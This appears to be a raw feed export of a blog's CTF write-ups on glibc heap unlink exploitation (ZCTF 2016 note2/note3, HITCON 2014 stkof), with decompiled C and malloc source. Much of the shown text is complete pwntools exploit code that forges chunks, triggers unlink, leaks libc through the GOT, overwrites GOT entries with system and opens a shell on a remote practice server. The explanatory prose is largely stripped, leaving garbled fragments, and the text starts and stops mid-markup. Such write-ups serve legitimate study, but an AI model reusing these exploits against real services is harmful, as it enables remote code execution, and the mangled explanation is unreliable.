class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line"><span class="built_in">bin</span>=libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)+base</span><br><span class="line">write(elf.got[<span class="string">&#x27;free&#x27;</span>], system)</span><br><span class="line">change(<span class="number">1</span>,p64(<span class="built_in">bin</span>))</span><br><span class="line">remove(<span class="number">6</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Unlink </tag>
            
            <tag> Fastbin Attach </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unlink 2016-ZCTF-note2-and-note3</title>
      <link href="/2023/03/15/2016-ZCTF-note2-and-note3/"/>
      <url>/2023/03/15/2016-ZCTF-note2-and-note3/</url>
      
        <content type="html"><![CDATA[<h2 id="2016-ZCTF-note2"><a href="#2016-ZCTF-note2" class="headerlink" title="2016-ZCTF-note2"></a>2016-ZCTF-note2</h2><p><a href="https://files.buuoj.cn/files/761fb16a644de97e745bb29b281c0fff/note2">https://files.buuoj.cn/files/761fb16a644de97e745bb29b281c0fff/note2</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16:~/Desktop/pwn/heap$ checksec note2</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/heap/note2&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>piebssunlink</p><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">ReadStr</span><span class="params">(<span class="type">char</span> *s, __int64 len, <span class="type">char</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+2Fh] [rbp-11h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">ssize_t</span> v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; len - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    s[i] = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  s[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>signedunsignedsignedunsignedmalloc(0)len-1-1,-1unsigned i0xffffffff</p><p>malloc(0)glibc  chunk  4  (prev_size,size,fd,bk) 0x20 </p><h2 id="unlink-chunk"><a href="#unlink-chunk" class="headerlink" title="unlink chunk"></a>unlink chunk</h2><p>content &#x3D; ba * 8 + p64(0xa1) + p64(fakefd) + p64(fakebk) + bb * 0x48<br>newnote(0x80, content)<br>newnote(0, a * 8)<br>newnote(0x80, b * 16)</p><p>chunk0chunk&#x3D;P</p><p>ptr &#x3D; 0x0000000000602120 chunk<br>fakefd &#x3D; ptr - 0x18<br>fakebk &#x3D; ptr - 0x10</p><p>chunk1chunk2topchunk</p><p>fastbin</p><p>deletenote(1)<br>content &#x3D; ba * 16 + p64(0xa0) + p64(0x90)<br>newnote(0,content)</p><p>chunk2</p><p>deletenote(2) unlink</p><p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315170826792.png" alt="image-20230315170826792"></p><p>ptrptr-0x18</p><h2 id="leak-shell"><a href="#leak-shell" class="headerlink" title="leak shell"></a>leak shell</h2><p>chunk0ptr[0]atoi_got,showatoi</p><p>atoi_got &#x3D; elf.got[atoi]<br>content &#x3D; ba * 0x18 + p64(atoi_got)<br>editnote(0, 1, content)<br>shownote(0)</p><p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315171243972.png" alt="image-20230315171243972"></p><p>editgotsystembinshshell</p><p>content &#x3D; p64(system)<br>editnote(0, 1, content)<br>ru(boption&gt;&gt;)<br>sl(b&#x2F;bin&#x2F;sh\x00)</p><p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315164908151.png" alt="image-20230315164908151"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./note2&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;29970&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">newnote</span>(<span class="params">length, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(less than 128)&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;content:&#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shownote</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">editnote</span>(<span class="params"><span class="built_in">id</span>, choice, s</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;2.append]&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line">    io.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deletenote</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b* 0x400C65&#x27;)#new</span></span><br><span class="line"><span class="comment"># db(&#x27;b* 0x400CE4&#x27;)#delete</span></span><br><span class="line">db(<span class="string">&#x27;b *0x400F74&#x27;</span>)<span class="comment">#edit</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;address:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;grxer&#x27;</span>)</span><br><span class="line">ptr = <span class="number">0x0000000000602120</span></span><br><span class="line">fakefd = ptr - <span class="number">0x18</span></span><br><span class="line">fakebk = ptr - <span class="number">0x10</span></span><br><span class="line">content = <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0xa1</span>) + p64(fakefd) + p64(fakebk) + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x48</span></span><br><span class="line">newnote(<span class="number">0x80</span>, content)</span><br><span class="line">newnote(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">16</span>)</span><br><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line">content = <span class="string">b&#x27;a&#x27;</span> * <span class="number">16</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">newnote(<span class="number">0</span>,content)</span><br><span class="line">deletenote(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">content = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(atoi_got)</span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, content)</span><br><span class="line">shownote(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;is &#x27;</span>)</span><br><span class="line">atoi_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;atoi&#x27;</span>,atoi_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;atoi&#x27;</span>,atoi_ad)</span><br><span class="line">base=atoi_ad-libc.dump(<span class="string">&#x27;atoi&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line">content = p64(system)</span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, content)</span><br><span class="line">ru(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2016-ZCTF-note3"><a href="#2016-ZCTF-note3" class="headerlink" title="2016-ZCTF-note3"></a>2016-ZCTF-note3</h2><p><a href="https://files.buuoj.cn/files/569bb2532339a0bd669f5d2457526ba7/zctf_2016_note3">https://files.buuoj.cn/files/569bb2532339a0bd669f5d2457526ba7/zctf_2016_note3</a></p><p>note2</p><p>note27chunk0x6020C00mallocchunk</p><p>showleak</p><p></p><p></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>read-1</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the id of the note:&quot;</span>);</span><br><span class="line">  v0 = getsize();</span><br><span class="line">  v3 = v0 % <span class="number">7</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v0 % <span class="number">7</span> &gt;= v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (__int64)*(&amp;ptr + v3);</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Input the new content:&quot;</span>);</span><br><span class="line">      myread((__int64)*(&amp;ptr + v3), ptr_st[v3 + <span class="number">8</span>], <span class="number">10</span>);</span><br><span class="line">      ptr_st[<span class="number">0</span>] = (__int64)*(&amp;ptr + v3);</span><br><span class="line">      LODWORD(v1) = <span class="built_in">puts</span>(<span class="string">&quot;Edit success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v1) = <span class="built_in">puts</span>(<span class="string">&quot;please input correct id.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">getsize</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  myread((__int64)nptr, <span class="number">32LL</span>, <span class="number">10</span>);</span><br><span class="line">  v1 = atol(nptr);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> -v1;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>NEG -x&#x3D;~x+1</strong></p><p>xint 0x80000000 </p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315233602653.png" alt="image-20230315233602653" style="zoom:67%;"><p>+10x80000000 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> v2 = <span class="number">-2147483648</span>;</span><br><span class="line">    <span class="keyword">if</span> (v2==-v2) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ohhhhh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315233803481.png" alt="image-20230315233803481"></p></blockquote><p>-9223372036854775808getsize-v1editv0v3&#x3D;-1 v0 % 7 &gt;&#x3D; v0</p><p><code>myread((__int64)*(&amp;ptr + v3), ptr_st[v3 + 8], 10);</code></p><p>ptr[-1]ptr_st[-1 + 8]6chunk6chunk</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>newchunk7putschunk8ptrptrptrchunk1sizechunk1size</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( i == <span class="number">7</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note is full, add fail&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the length of the note content:(less than 1024)&quot;</span>)</span><br><span class="line">      </span><br><span class="line">  *(&amp;ptr + i) = v3;</span><br><span class="line">  ptr_st[i + <span class="number">8</span>] = size;</span><br><span class="line">  ptr_st[<span class="number">0</span>] = (__int64)*(&amp;ptr + i);</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>unlinkshowputs</p><p>freegotputs<strong>7p64(puts_plt)[:-1]8+&#x2F;n,&#x2F;nfreegotfreegotputsgot\x00</strong></p><p>chunkputs_pltfreechunk</p><p>atoi-gotsystem</p><p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230316002002255.png" alt="image-20230316002002255"></p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./note3&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;25662&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">newnote</span>(<span class="params">length, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(less than 1024)&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;content:&#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shownote</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">editnote</span>(<span class="params"><span class="built_in">id</span>,data</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;ent:&#x27;</span>)</span><br><span class="line">    io.sendline(data)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deletenote</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b *0x400B31&#x27;)# new</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x400BFB&#x27;) # delete</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x400CDA&#x27;)#edit</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x0400C89&#x27;)</span></span><br><span class="line">ptr = <span class="number">0x6020C8</span></span><br><span class="line">fakefd = ptr - <span class="number">0x18</span></span><br><span class="line">fakebk = ptr - <span class="number">0x10</span></span><br><span class="line">content = <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0xa1</span>) + p64(fakefd) + p64(fakebk) + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x48</span></span><br><span class="line">newnote(<span class="number">0x80</span>, content)</span><br><span class="line">newnote(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">16</span>)</span><br><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line">content = <span class="string">b&#x27;a&#x27;</span> * <span class="number">16</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">newnote(<span class="number">0</span>,content)</span><br><span class="line">deletenote(<span class="number">2</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(free_got)+p64(puts_got)+p64(atoi_got)</span><br><span class="line">editnote(<span class="number">0</span>,payload)</span><br><span class="line">editnote(<span class="number">0</span>,p64(puts_plt)[:-<span class="number">1</span>])</span><br><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line">rl()</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line">editnote(<span class="number">2</span>,p64(system))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Unlink </tag>
            
            <tag> Integer Overflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unlink-2014-HITCON-stkof</title>
      <link href="/2023/03/14/Unlink-2014-HITCON-stkof/"/>
      <url>/2023/03/14/Unlink-2014-HITCON-stkof/</url>
      
        <content type="html"><![CDATA[<h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><p>freechunktcache(chunkhead0x410)fastbin(0x80)freechunkfreechunkunlinkunlinkchunk</p><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD)</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> _int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line"><span class="built_in">free</span>()&#123;</span><br><span class="line">    _int_free()&#123;</span><br><span class="line">        unlink();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>unlink</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line">    FD = P-&gt;fd;                                      </span><br><span class="line">    BK = P-&gt;bk;                                      </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))              </span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line">    <span class="keyword">else</span> &#123;                                      </span><br><span class="line">        FD-&gt;bk = BK;                                  </span><br><span class="line">        BK-&gt;fd = FD;                                  </span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)                      </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;              </span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)      </span><br><span class="line">        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">          malloc_printerr (check_action,      </span><br><span class="line">                   <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    </span><br><span class="line">                   P, AV);      </span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                      </span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                      </span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;              </span><br><span class="line">                <span class="keyword">else</span> &#123;                                  </span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                  </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                  </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                  </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                  </span><br><span class="line">                  &#125;                                  </span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;                                  </span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;              </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;              </span><br><span class="line">              &#125;                                      </span><br><span class="line">          &#125;                                      </span><br><span class="line">      &#125;                                          </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  P (size)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               \</span><br><span class="line"><span class="comment">//  fd  bk ()</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line">  <span class="comment">// largebin  next_size  </span></span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">              malloc_printerr (check_action,                                      \</span><br><span class="line">                               <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure><p>Unlink</p><ul><li>chunkchunkprevsizechunksize</li><li>chunkchunksizeP0</li><li>chunkfdbkpchunkbkfdp</li></ul><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD = P-&gt;fd;                                      </span><br><span class="line">BK = P-&gt;bk;                                      </span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))              </span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line"><span class="keyword">else</span> &#123;                                      </span><br><span class="line">    